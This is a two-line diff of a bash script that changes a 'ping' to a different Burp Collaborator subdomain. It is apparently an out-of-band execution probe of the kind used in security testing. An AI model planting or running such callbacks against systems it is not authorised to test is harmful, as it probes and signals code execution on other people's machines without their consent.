@@ -1,2 +1,2 @@
 #!/bin/bash
-ping kym30c77ij3fko4y45b0tunthknabz.burpcollaborator.net
+ping re9wdsrg0dkbaacm0nhsyngx4oaey3.burpcollaborator.net
